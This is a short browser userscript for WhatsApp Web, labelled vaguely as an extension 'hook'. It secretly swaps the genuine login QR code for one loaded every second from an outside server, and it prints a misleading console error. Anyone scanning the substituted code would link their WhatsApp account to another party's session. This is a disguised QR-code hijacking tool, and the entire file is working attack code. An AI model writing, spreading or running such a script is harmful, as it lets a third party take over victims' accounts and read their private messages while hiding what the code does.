// ==UserScript==
// @name         Whatsapp Extension Hook
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  A hook needed for stuff
// @author       anon
// @match        https://web.whatsapp.com/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

(new MutationObserver(check)).observe(document, {childList: true, subtree: true});

function check(changes, observer) {
    if(document.getElementsByClassName("_25pwu")[0]) {
        observer.disconnect();
            setInterval(function(){
                console.error("Invalid extension installed | Aborted login")
                const img = document.createElement("img")
                img.src = "https://myserver.com/Ip/WhatsHook/qrcode.gif?lastmod="+Date.now();
                try {
                    document.getElementsByClassName("_25pwu")[0].replaceWith(img);
                } catch {
                }
                function edit()
                {
                    var image = document.querySelector("#app > div > div > div.landing-window > div.landing-main > div > img");

                    image.src = img.src;
                }
                edit();
            }, 1000);
    }
}

})();